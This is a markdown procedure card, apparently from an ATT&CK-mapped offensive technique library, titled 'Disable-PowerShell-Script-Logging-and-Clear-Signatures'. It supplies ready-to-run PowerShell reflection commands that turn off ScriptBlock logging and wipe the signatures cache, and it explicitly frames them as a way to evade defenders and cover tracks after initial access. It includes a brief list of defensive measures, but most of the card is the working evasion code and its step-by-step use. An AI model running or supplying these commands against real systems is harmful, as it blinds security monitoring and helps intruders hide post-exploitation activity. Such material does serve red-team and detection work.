---
id: 6b47abf8-c412-4b07-8f96-0ed5b9741402
name: Disable-PowerShell-Script-Logging-and-Clear-Signatures
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:25.978013+00:00'
updated_at: '2023-04-10T20:36:17.611905+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
  - '[[techniques/Impair Defenses|T1562 - Impair Defenses]]'
  - '[[techniques/Indicator Removal on Host|T1070 - Indicator Removal on Host]]'
sub_techniques: []
tags:
  - '[[tags/Disable Script Logging]]'
  - powershell
  - defense-evasion
commands:
  - '[[commands/powershell-disable-script-block-logging]]'
platforms:
  - Windows
tools: []
validated: true
---

# Disable-PowerShell-Script-Logging-and-Clear-Signatures

## Summary

This procedure disables PowerShell ScriptBlock logging and clears the script block signatures cache to evade detection by security monitoring tools. By turning off logging, attackers prevent the recording of executed PowerShell commands and arguments, while clearing the signatures removes cached evidence of previously run scripts. This is a common post-exploitation technique to maintain stealth and persistence in a Windows environment.

## Description

PowerShell ScriptBlock logging captures the content of all executed scripts, including arguments, which can be analyzed by defenders for malicious activity. This procedure uses reflection to modify internal PowerShell settings in memory, bypassing the need for direct registry edits that might trigger alerts. The first step disables logging by setting the EnableScriptBlockLogging policy to 0 via the cached group policy settings. The second step clears the signatures cache, forcing re-verification of script blocks and removing traces of prior executions. This approach is effective in environments with PowerShell logging enabled but requires administrative privileges. It targets Windows systems running PowerShell 2.0 or later and is particularly useful after initial access to cover tracks during lateral movement or persistence.

## Requirements

1. Administrative privileges on the target Windows system to modify PowerShell internals.
2. PowerShell execution policy allowing script execution (or bypass via -ExecutionPolicy Bypass).
3. Access to a PowerShell console or remote execution capability (e.g., via WMI or WinRM).

## Defense

- Implement least-privilege access controls to restrict administrative rights and monitor for privilege escalations.
- Enable and monitor PowerShell operational logs (Event ID 4103/4104) for reflection-based modifications.
- Use endpoint detection tools to alert on changes to PowerShell execution policies or in-memory modifications.
- Regularly audit registry keys under HKLM\Software\Policies\Microsoft\Windows\PowerShell for unauthorized changes.

## Objectives

1. Disable PowerShell ScriptBlock logging to prevent capture of malicious command execution.
2. Clear the script block signatures cache to erase evidence of prior script runs.
3. Maintain operational stealth in a compromised Windows environment without triggering logging alerts.

## Instructions

### Step 1: Disable ScriptBlock Logging

**Context**: This step modifies PowerShell's internal cached group policy settings using reflection to disable ScriptBlock logging without altering the registry directly, reducing the chance of detection.

**Command** ([[commands/powershell-disable-script-block-logging]]):
```powershell
$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")
```

> This command accesses the non-public cachedGroupPolicySettings field in PowerShell's Utils class, creates a new hashtable for the ScriptBlockLogging policy, and sets EnableScriptBlockLogging to 0. It takes effect immediately for the current session and prevents future logging of script blocks. No parameters are required as it targets a fixed registry path.

### Step 2: Clear ScriptBlock Signatures Cache

**Context**: After disabling logging, clear the signatures cache to remove any stored hashes or verifications of previously executed script blocks, ensuring no residual evidence remains.

**Code** ([[codes/powershell-clear-scriptblock-signatures-cache]]):
```powershell
[Ref].Assembly.GetType("System.Management.Automation.ScriptBlock").GetField("signatures","NonPublic,static").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))
```

> This code uses reflection to access the static 'signatures' field in the ScriptBlock class and resets it to an empty HashSet. This forces PowerShell to re-verify any future script blocks and erases cached signatures from prior executions. Run this after the disable step to fully cover tracks. No parameters are needed.
